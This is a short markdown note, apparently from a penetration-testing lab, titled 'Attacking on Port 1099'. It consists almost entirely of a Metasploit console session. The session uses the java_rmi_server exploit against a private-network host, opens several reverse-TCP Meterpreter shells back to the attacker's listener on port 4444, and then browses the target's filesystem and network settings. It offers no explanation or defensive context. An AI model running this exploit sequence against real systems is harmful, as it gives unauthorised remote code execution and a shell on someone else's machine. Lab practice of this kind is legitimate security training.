# Attacking on Port 1099

```

msf > search java_rmi
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                            Disclosure Date  Rank       Description
   ----                                            ---------------  ----       -----------
   auxiliary/gather/java_rmi_registry                               normal     Java RMI Registry Interfaces Enumeration
   auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     Java RMI Server Insecure Endpoint Code Execution Scanner
   exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  Java RMIConnectionImpl Deserialization Privilege Escalation
   exploit/multi/misc/java_rmi_server              2011-10-15       excellent  Java RMI Server Insecure Default Configuration Java Code Execution


msf > use exploit/multi/misc/java_rmi_server
msf exploit(java_rmi_server) > show options

Module options (exploit/multi/misc/java_rmi_server):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
   RHOST                       yes       The target address
   RPORT      1099             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)


msf exploit(java_rmi_server) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(java_rmi_server) > exploit

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] 192.168.56.101:1099 - Using URL: http://0.0.0.0:8080/ghZQ99EiBthwHgF
[*] 192.168.56.101:1099 - Local IP: http://127.0.0.1:8080/ghZQ99EiBthwHgF
[*] 192.168.56.101:1099 - Server started.
[*] 192.168.56.101:1099 - Sending RMI Header...
[*] 192.168.56.101:1099 - Sending RMI Call...
[*] 192.168.56.101:1099 - Replied to request for payload JAR
[*] Sending stage (51091 bytes) to 192.168.56.101
[*] Meterpreter session 4 opened (192.168.56.102:4444 -> 192.168.56.101:33780) at 2018-05-23 05:43:09 +0000
[+] negotiating tlv encryption
[*] Sending stage (51091 bytes) to 192.168.56.101
[*] Meterpreter session 5 opened (192.168.56.102:4444 -> 192.168.56.101:51886) at 2018-05-23 05:43:10 +0000
[+] negotiating tlv encryption
[*] Sending stage (51091 bytes) to 192.168.56.101
[*] Meterpreter session 6 opened (192.168.56.102:4444 -> 192.168.56.101:58674) at 2018-05-23 05:43:10 +0000
[*] Sending stage (51091 bytes) to 192.168.56.101
[+] negotiating tlv encryption
[+] negotiated tlv encryption
[+] negotiated tlv encryption
[+] negotiated tlv encryption
[+] negotiated tlv encryption
[*] Meterpreter session 7 opened (192.168.56.102:4444 -> 192.168.56.101:54954) at 2018-05-23 05:43:10 +0000
[+] negotiating tlv encryption
[*] Sending stage (51091 bytes) to 192.168.56.101
[+] negotiated tlv encryption
[+] negotiated tlv encryption
[-] Failed to load client script file: /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi.rb
[*] Meterpreter session 8 opened (192.168.56.102:4444 -> 192.168.56.101:49976) at 2018-05-23 05:43:10 +0000
[+] negotiating tlv encryption
[+] negotiated tlv encryption
[+] negotiated tlv encryption
[*] Sending stage (51091 bytes) to 192.168.56.101
[*] 192.168.56.101:1099 - Server stopped.


[+] negotiated tlv encryption
[+] negotiated tlv encryption
meterpreter > pwd
/
meterpreter > ls -la
Listing: /
==========

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40666/rw-rw-rw-   4096     dir   2012-05-14 03:35:33 +0000  bin
40666/rw-rw-rw-   1024     dir   2012-05-14 03:36:28 +0000  boot
40666/rw-rw-rw-   4096     dir   2010-03-16 22:55:51 +0000  cdrom
40666/rw-rw-rw-   13480    dir   2018-05-21 16:16:27 +0000  dev
40666/rw-rw-rw-   4096     dir   2018-05-21 07:06:02 +0000  etc
40666/rw-rw-rw-   4096     dir   2010-04-16 06:16:02 +0000  home
40666/rw-rw-rw-   4096     dir   2010-03-16 22:57:40 +0000  initrd
100666/rw-rw-rw-  7929183  fil   2012-05-14 03:35:56 +0000  initrd.img
40666/rw-rw-rw-   4096     dir   2012-05-14 03:35:22 +0000  lib
40666/rw-rw-rw-   16384    dir   2010-03-16 22:55:15 +0000  lost+found
40666/rw-rw-rw-   4096     dir   2010-03-16 22:55:52 +0000  media
40666/rw-rw-rw-   4096     dir   2010-04-28 20:16:56 +0000  mnt
100666/rw-rw-rw-  7462     fil   2018-05-21 15:21:29 +0000  nohup.out
40666/rw-rw-rw-   4096     dir   2010-03-16 22:57:39 +0000  opt
40666/rw-rw-rw-   0        dir   2018-05-21 07:05:27 +0000  proc
40666/rw-rw-rw-   4096     dir   2018-05-21 07:06:04 +0000  root
40666/rw-rw-rw-   4096     dir   2012-05-14 01:54:53 +0000  sbin
40666/rw-rw-rw-   4096     dir   2010-03-16 22:57:38 +0000  srv
40666/rw-rw-rw-   0        dir   2018-05-21 07:05:28 +0000  sys
40666/rw-rw-rw-   4096     dir   2018-05-21 16:49:32 +0000  tmp
40666/rw-rw-rw-   4096     dir   2010-04-28 04:06:37 +0000  usr
40666/rw-rw-rw-   4096     dir   2012-05-20 21:30:19 +0000  var
40666/rw-rw-rw-   4096     dir   2018-05-21 09:47:06 +0000  venkat
100666/rw-rw-rw-  1987288  fil   2008-04-10 16:55:41 +0000  vmlinuz

meterpreter > ifconfig

Interface  1
============
Name         : lo - lo
Hardware MAC : 00:00:00:00:00:00
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ::


Interface  2
============
Name         : eth0 - eth0
Hardware MAC : 00:00:00:00:00:00
IPv4 Address : 192.168.56.101
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::a00:27ff:fef0:f2f4
IPv6 Netmask : ::



```



